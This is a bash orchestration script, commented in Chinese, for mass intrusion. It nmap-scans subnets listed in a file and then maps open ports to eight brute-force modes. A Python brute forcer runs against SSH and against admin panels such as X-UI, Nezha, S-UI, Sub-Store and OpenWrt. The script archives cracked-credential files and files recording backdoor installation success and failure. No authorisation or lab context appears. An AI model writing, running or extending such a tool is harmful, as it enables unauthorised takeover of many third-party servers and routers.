#!/usr/bin/env bash
#
# scan_all.sh - 一键端口扫描+爆破
#
# 用法:
#   bash scan_all.sh <网段文件> [爆破模式]
#
# 爆破模式:
#   - 不指定: 根据端口号自动匹配爆破模式
#   - 数字1-8: 强制使用指定模式（跳过端口映射，直接用该模式爆破所有开放端口）
#

set -Eeuo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"

# ── 参数检查 ──
if [[ $# -lt 1 ]]; then
    echo "用法: bash scan_all.sh <网段文件> [爆破模式(1-8)]" >&2
    echo "" >&2
    echo "示例:" >&2
    echo "  bash scan_all.sh subnets.txt           # 端口映射自动爆破" >&2
    echo "  bash scan_all.sh subnets.txt 1         # 强制模式1爆破" >&2
    echo "  bash scan_all.sh subnets.txt 6         # 强制SSH爆破" >&2
    exit 1
fi

SUBNET_FILE="$1"
FORCE_MODE="${2:-}"

if [[ ! -f "$SUBNET_FILE" ]]; then
    echo "错误: 网段文件不存在: $SUBNET_FILE" >&2
    exit 1
fi

# ── 路径定义 ──
CONFIG_DIR="$SCRIPT_DIR/config"
SCANNER_DIR="$SCRIPT_DIR/src/scanner"
BRUTE_DIR="$SCRIPT_DIR/src/brute"
OUTPUT_DIR="$SCRIPT_DIR/output"
PORTS_DIR="$OUTPUT_DIR/ports"
BRUTE_OUT_DIR="$OUTPUT_DIR/brute"

# ── 端口→模式映射 ──
declare -A PORT_MODE_MAP=(
    [22]="6"
    [80]="1,2,3,4,5,7,8"
    [443]="1,2,3,4,5,7,8"
    [8080]="1,2,3,4,5,7,8"
    [8443]="1,2,3,4,5,7,8"
    [2053]="1"
    [2083]="1"
    [2087]="1"
    [2095]="5"
    [2096]="5"
    [54321]="1"
    [8008]="2"
    [3000]="2,7"
    [3001]="7"
)

echo "========================================"
echo "  端口扫描 + 自动爆破"
echo "========================================"
echo ""
echo "网段文件: $SUBNET_FILE"
echo "输出目录: $OUTPUT_DIR"
echo ""

# ════════════════════════════════════════
# 阶段 1: 端口扫描
# ════════════════════════════════════════
echo ">>> 阶段 1/2: nmap 端口扫描"
echo ""

mkdir -p "$PORTS_DIR"
# 清空旧的端口结果
rm -f -- "$PORTS_DIR"/*_port.txt 2>/dev/null || true

bash "$SCANNER_DIR/scan_ports.sh" "$SUBNET_FILE"

echo ""
echo ">>> 端口扫描完成"
echo ""

# ════════════════════════════════════════
# 阶段 2: 端口映射爆破
# ════════════════════════════════════════
echo ">>> 阶段 2/2: 端口映射爆破"
echo ""

# 确保 brute 临时目录存在
cd "$BRUTE_DIR"
mkdir -p temp_parts xui_outputs temp_hmsuccess temp_hmfail

run_brute() {
    local mode="$1"
    local input_file="$2"
    local input_name
    input_name=$(basename "$input_file" .txt)

    echo "--- 模式 $mode: $input_name ($input_file) ---"

    # 运行爆破
    python3 main.py -m "$mode" -i "$input_file" --no-excel

    # 归档结果
    local time_str
    time_str=$(date +%Y%m%d-%H%M)
    local latest_dir="$BRUTE_OUT_DIR/latest"
    local history_dir="$BRUTE_OUT_DIR/history/$time_str"

    mkdir -p "$latest_dir" "$history_dir"

    # 移动 brute 产生的结果文件到 latest
    for f in XUI-*.txt 哪吒-*.txt HUI-*.txt 咸蛋-*.txt SUI-*.txt ssh-*.txt substore-*.txt OpenWrt-*.txt xui.txt; do
        if [[ -f "$f" ]]; then
            cp "$f" "$latest_dir/"
            mv "$f" "$history_dir/"
        fi
    done

    # 移动 Excel
    for f in XUI-*.xlsx 哪吒-*.xlsx HUI-*.xlsx 咸蛋-*.xlsx SUI-*.xlsx ssh-*.xlsx substore-*.xlsx OpenWrt-*.xlsx xui.xlsx; do
        if [[ -f "$f" ]]; then
            cp "$f" "$latest_dir/"
            mv "$f" "$history_dir/"
        fi
    done

    # 移动后门结果
    for f in 后门安装成功-*.txt 后门安装失败-*.txt hmsuccess.txt hmfail.txt; do
        if [[ -f "$f" ]]; then
            cp "$f" "$latest_dir/"
            mv "$f" "$history_dir/"
        fi
    done

    echo "  结果已归档到 $history_dir"
    echo ""
}

if [[ -n "$FORCE_MODE" ]]; then
    # 强制模式: 用所有端口扫描结果（合并所有 *_port.txt）
    echo "使用强制模式: $FORCE_MODE"
    echo ""

    # 合并所有端口扫描结果到临时文件
    MERGED_INPUT="$BRUTE_DIR/temp_merged_targets.txt"
    > "$MERGED_INPUT"
    for port_file in "$PORTS_DIR"/*_port.txt; do
        [[ -f "$port_file" ]] && cat "$port_file" >> "$MERGED_INPUT"
    done

    if [[ -s "$MERGED_INPUT" ]]; then
        sort -u -o "$MERGED_INPUT" "$MERGED_INPUT"
        run_brute "$FORCE_MODE" "$MERGED_INPUT"
    else
        echo "  没有发现开放端口"
    fi

    rm -f "$MERGED_INPUT"
else
    # 自动模式: 根据端口号查表分配到对应模式
    # 清理旧的临时文件
    rm -f "$BRUTE_DIR"/temp_mode_*.txt 2>/dev/null || true

    # 统计发现的端口
    port_count=0
    for port_file in "$PORTS_DIR"/*_port.txt; do
        [[ -f "$port_file" ]] || continue
        [[ -s "$port_file" ]] || continue
        port=$(basename "$port_file" _port.txt)
        modes="${PORT_MODE_MAP[$port]:-}"
        if [[ -n "$modes" ]]; then
            port_count=$((port_count + 1))
        fi
    done

    if [[ "$port_count" -eq 0 ]]; then
        echo "  未发现可映射的开放端口"
    else
        # 按端口号分配目标到对应模式
        for port_file in "$PORTS_DIR"/*_port.txt; do
            [[ -f "$port_file" ]] || continue
            [[ -s "$port_file" ]] || continue
            port=$(basename "$port_file" _port.txt)
            modes="${PORT_MODE_MAP[$port]:-}"

            if [[ -z "$modes" ]]; then
                continue
            fi

            target_count=$(wc -l < "$port_file" | tr -d ' ')
            echo "  端口 $port -> 模式 [$modes] ($target_count 个目标)"

            IFS=',' read -ra mode_list <<< "$modes"
            for m in "${mode_list[@]}"; do
                cat "$port_file" >> "$BRUTE_DIR/temp_mode_${m}.txt"
            done
        done

        echo ""

        # 逐模式爆破
        for m in 1 2 3 4 5 6 7 8; do
            mode_file="$BRUTE_DIR/temp_mode_${m}.txt"
            [[ -f "$mode_file" ]] || continue
            [[ -s "$mode_file" ]] || continue

            sort -u -o "$mode_file" "$mode_file"
            target_count=$(wc -l < "$mode_file" | tr -d ' ')
            echo ">>> 模式 $m: $target_count 个目标"
            run_brute "$m" "$mode_file"
        done

        # 清理临时文件
        rm -f "$BRUTE_DIR"/temp_mode_*.txt 2>/dev/null || true
    fi
fi

# ════════════════════════════════════════
# 清理历史，只保留最近 3 个
# ════════════════════════════════════════
if [[ -d "$BRUTE_OUT_DIR/history" ]]; then
    history_count=$(ls -d "$BRUTE_OUT_DIR/history"/*/ 2>/dev/null | wc -l | tr -d ' ')
    if [[ "$history_count" -gt 3 ]]; then
        echo ">>> 清理历史记录（保留最近 3 个）"
        # 按时间排序，删除最早的
        ls -dt "$BRUTE_OUT_DIR/history"/*/ | tail -n +4 | while read -r old_dir; do
            echo "  删除: $(basename "$old_dir")"
            rm -rf "$old_dir"
        done
    fi
fi

# 回到项目根目录
cd "$SCRIPT_DIR"

echo ""
echo "========================================"
echo "  全部完成！"
echo "========================================"
echo ""
echo "输出目录:"
echo "  端口扫描: $PORTS_DIR/"
echo "  爆破结果: $BRUTE_OUT_DIR/latest/"
echo "  历史记录: $BRUTE_OUT_DIR/history/"
